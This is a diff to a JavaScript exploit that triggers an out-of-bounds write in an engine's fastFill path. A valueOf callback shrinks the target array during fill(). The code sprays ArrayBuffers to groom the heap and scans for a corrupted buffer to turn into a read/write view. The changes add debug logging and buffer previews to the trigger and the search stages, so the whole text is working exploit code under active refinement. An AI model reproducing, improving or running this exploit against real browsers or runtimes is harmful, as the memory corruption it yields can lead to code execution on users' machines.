@@ -120,9 +120,33 @@ function match_marker(u8, offset = 0) {
   return true;
 }
 
+// ---------- diagnostic helpers (آمنة) ----------
+function hexdump_u8(u8, len = 32) {
+  const n = Math.min(len, u8.length);
+  const parts = [];
+  for (let i = 0; i < n; i++) {
+    parts.push(u8[i].toString(16).padStart(2, "0"));
+  }
+  return parts.join(" ");
+}
+
+function preview_buffers(buffers, count = 8) {
+  for (let i = 0; i < Math.min(count, buffers.length); i++) {
+    try {
+      const v = new Uint8Array(buffers[i]);
+      log(`DEBUG: groom preview idx=${i} byte0=${v[0].toString(16).padStart(2, "0")} first32=${hexdump_u8(v, 32)}`);
+    } catch (e) {
+      log(`DEBUG: preview failed idx=${i} err=${e}`);
+    }
+  }
+}
+
+// ========== CORE TRIGGER (محسّن مع logging) ========== //
+
 /**
  * Trigger the fastFill OOB-write vulnerability
  * Uses an improved pattern: repeated attempts, GC yields, and diverse grooming.
+ * Added diagnostic logging only (valueOf invocation, previews).
  */
 async function trigger_oob_write() {
   log("STAGE: Triggering OOB-write (improved)");
@@ -137,14 +161,21 @@ async function trigger_oob_write() {
       const ab = new ArrayBuffer(ssv_len);
       // seed beginning with a distinguishable byte so we can later differentiate
       const v = new Uint8Array(ab);
-      v[0] = 0x99;
+      v[0] = 0x99 ^ (round & 0xff);
       array_buffers.push(ab);
     }
     gc();
     if ((round & 3) === 0) await sleep(0);
+    // quick early preview every 128 rounds to avoid excessive logging
+    if ((round & 127) === 0 && round !== 0) {
+      log(`DEBUG: groom progress round ${round} / ${OOB_GROOM_ROUNDS}`);
+      preview_buffers(array_buffers, 4);
+    }
   }
 
-  log(`Groomed ${array_buffers.length} ArrayBuffers`);
+  log(`Groomed ${array_buffers.length} ArrayBuffers (ssv_len=${ssv_len})`);
+  // preview first few groomed buffers (diagnostic)
+  preview_buffers(array_buffers, 8);
 
   // Create target array for OOB-write
   const target_array = [];
@@ -156,6 +187,7 @@ async function trigger_oob_write() {
 
   const evil_object = {
     valueOf: function() {
+      log("DEBUG: valueOf() invoked — shrinking target_array");
       if (!length_changed) {
         // Shrink array during fastFill execution
         target_array.length = 10;
@@ -177,6 +209,7 @@ async function trigger_oob_write() {
         // Fill with an object carrying the marker (engine may serialize or write its representation)
         const marker_obj = { marker: MARKER.slice() };
         target_array.fill(marker_obj, evil_object);
+        log(`DEBUG: fill attempt ${attempt} executed`);
       } catch (e) {
         log(`fill attempt ${attempt} threw: ${e}`);
       }
@@ -188,11 +221,15 @@ async function trigger_oob_write() {
     log(`trigger_oob_write top-level exception: ${e}`);
   }
 
+  // small final wait to let any delayed writes settle
+  await sleep(20);
+
   return [target_array, array_buffers];
 }
 
 /**
  * Find corrupted ArrayBuffer via OOB-write (improved scan with retries and variant sizes)
+ * Added diagnostic logging and buffer previews.
  */
 async function find_corrupted_arraybuffer(target_array, array_buffers) {
   log("STAGE: Searching for corrupted ArrayBuffer (improved scan)");
@@ -208,6 +245,7 @@ async function find_corrupted_arraybuffer(target_array, array_buffers) {
     for (let off = 0; off <= maxScan; off++) {
       if (match_marker(view, off)) {
         log(`Found corrupted ArrayBuffer in initial groom at index ${i} offset ${off}`);
+        log(`DEBUG: candidate preview idx=${i} first32=${hexdump_u8(view, 32)}`);
         candidates.push({ ab, index: i, off });
         break;
       }
@@ -220,6 +258,7 @@ async function find_corrupted_arraybuffer(target_array, array_buffers) {
     // sanitize into SSV-like layout
     v[0] = 1;
     v.fill(0, 1);
+    log(`DEBUG: promoting initial candidate idx=${c.index}`);
     return new BufferView(c.ab);
   }
 
@@ -242,9 +281,15 @@ async function find_corrupted_arraybuffer(target_array, array_buffers) {
       // quick immediate check: maybe corruption already present
       if (view.length >= MARKER.length && match_marker(view, 0)) {
         log(`Found corrupted ArrayBuffer in secondary spray at idx ${i}, size ${size}`);
+        log(`DEBUG: secondary immediate found first32=${hexdump_u8(view, 32)}`);
         view[0] = 1;
         view.fill(0, 1);
         return new BufferView(ab);
+      }
+
+      // limit logging: print a preview for the first few of this spray
+      if (i < 4 && (retry % 5 === 0)) {
+        log(`DEBUG: secondary spray preview retry=${retry + 1} idx=${i} size=${size} first8=${hexdump_u8(view, 8)}`);
       }
     }
 
@@ -260,6 +305,7 @@ async function find_corrupted_arraybuffer(target_array, array_buffers) {
       for (let off = 0; off <= maxScan; off++) {
         if (match_marker(view, off)) {
           log(`Found corrupted ArrayBuffer in additional spray index ${i} offset ${off}`);
+          log(`DEBUG: secondary found preview idx=${i} first32=${hexdump_u8(view, 32)}`);
           view[0] = 1;
           view.fill(0, 1);
           return new BufferView(ab);
@@ -272,9 +318,11 @@ async function find_corrupted_arraybuffer(target_array, array_buffers) {
     for (let k = 0; k < 20; k++) {
       const ab = new ArrayBuffer(ssv_len);
       const v = new Uint8Array(ab);
-      v[0] = 0x55;
+      v[0] = 0x55 ^ (retry & 0xff);
       array_buffers.push(ab);
     }
+    // preview new groomed tail occasionally
+    if (retry % 5 === 0) preview_buffers(array_buffers, 3);
     gc();
     await sleep(5);
   }
